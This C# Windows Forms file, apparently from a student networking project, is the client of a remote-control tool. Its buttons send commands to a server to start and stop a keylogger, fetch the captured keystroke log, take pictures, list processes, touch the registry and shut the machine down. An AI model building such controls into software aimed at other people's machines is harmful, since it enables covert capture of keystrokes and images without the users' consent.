using System;
using System.Windows.Forms;
using System.IO;

namespace client
{
    // Giả định tên Form của bạn là 'keylog'
    public partial class keylog : Form
    {
        public keylog()
        {
            InitializeComponent();
        }

        // --- Nút KEYLOG / HOOK (Giả định là button1) ---
        private void button1_Click(object sender, EventArgs e) // Hook
        {
            if (Program.nw != null)
            {
                // 1. Gửi lệnh chuyển Server vào chế độ KEYLOG
                Program.nw.WriteLine("KEYLOG"); Program.nw.Flush();

                // 2. Gửi lệnh HOOK để Server bắt đầu ghi phím
                Program.nw.WriteLine("HOOK"); Program.nw.Flush();

                MessageBox.Show("Đã gửi lệnh HOOK. Keylogger đang chạy trên Server.");
            }
        }

        // --- Nút UNHOOK (Giả định là button2) ---
        private void button2_Click(object sender, EventArgs e) // Unhook
        {
            if (Program.nw != null)
            {
                // Gửi lệnh UNHOOK để Server dừng ghi phím
                Program.nw.WriteLine("UNHOOK"); Program.nw.Flush();
                MessageBox.Show("Đã gửi lệnh UNHOOK. Keylogger đã tạm dừng.");
            }
        }

        // --- Nút PRINT LOG (Giả định là button3) ---
        private void button3_Click(object sender, EventArgs e) // Print Log
        {
            if (Program.nw != null)
            {

                // Gửi lệnh chuyển Server vào chế độ KEYLOG
                Program.nw.WriteLine("KEYLOG"); Program.nw.Flush();
                // Gửi lệnh PRINT để Server gửi nội dung log file
                Program.nw.WriteLine("PRINT"); Program.nw.Flush();

                String? logContent;

                try
                {

                    if (Program.nr != null)
                    {

                        // Đọc dữ liệu log (Server gửi bằng WriteLine)
                        logContent = Program.nr.ReadLine();

                        if (!string.IsNullOrEmpty(logContent))
                        {
                            // Nếu bạn có RichTextBox tên là txtKQ:
                            // txtKQ.Text += logContent; 

                            // Hiển thị log qua MessageBox cho mục đích demo nhanh:
                            MessageBox.Show("Đã nhận Log: \n" + logContent, "Log Keylogger");
                        }
                        else
                        {
                            MessageBox.Show("Không có log mới hoặc đã xảy ra lỗi mạng.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Lỗi nhận Log: {ex.Message}");
                }
            }
        }

        private void btnShutdown_Click(object sender, EventArgs e)
        {
            if (Program.nw != null)
            {

                // Chức năng: Gửi lệnh SHUTDOWN đến Server
                String s = "SHUTDOWN";
                try
                {
                    Program.nw.WriteLine(s);
                    Program.nw.Flush();
                    MessageBox.Show("Đã gửi lệnh TẮT MÁY (Shutdown) đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Lỗi khi gửi lệnh Shutdown: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnRegistry_Click(object sender, EventArgs e)
        {
            if (Program.nw != null)
            {

                // Chức năng: Gửi lệnh REGISTRY (Giả định Server có logic xử lý)
                String s = "REGISTRY";
                try
                {
                    Program.nw.WriteLine(s);
                    Program.nw.Flush();
                    MessageBox.Show("Đã gửi lệnh REGISTRY đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Lỗi khi gửi lệnh Registry: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnProcess_Click(object sender, EventArgs e)
        {
            if (Program.nw != null)
            {

                // Chức năng: Gửi lệnh PROCESS (Giả định Server có logic xử lý)
                String s = "PROCESS";
                try
                {
                    Program.nw.WriteLine(s);
                    Program.nw.Flush();
                    MessageBox.Show("Đã gửi lệnh PROCESS đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Lỗi khi gửi lệnh Process: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnTakePic_Click(object sender, EventArgs e)
        {
            if (Program.nw != null)
            {

                // Chức năng: Gửi lệnh TAKE PIC (Giả định Server có logic xử lý)
                String s = "TAKEPIC";
                try
                {
                    Program.nw.WriteLine(s);
                    Program.nw.Flush();
                    MessageBox.Show("Đã gửi lệnh CHỤP ẢNH (Take Pic) đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Lỗi khi gửi lệnh Take Pic: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void butXoa_Click(object sender, EventArgs e)
        {
            // Chức năng: Xóa nội dung RichTextBox (Chỉ hoạt động trên Client)
            txtKQ.Text = "";
        }
        // --- Hàm Xóa Text (Giả định butXoa đã được tạo trong Designer) ---


        // --- Lệnh SHUTDOWN (Bạn cần tạo nút này trong Form Designer) ---

        private void keylog_closing(object sender, FormClosingEventArgs e)
        {
            if (Program.nw != null)
            {
                Program.nw.WriteLine("QUIT");
                Program.nw.Flush();
            }

            if (Program.client != null)
            {
                Program.client.Close();
                Program.client = null; // optional: đảm bảo không bị dùng lại
            }
        }
    }
}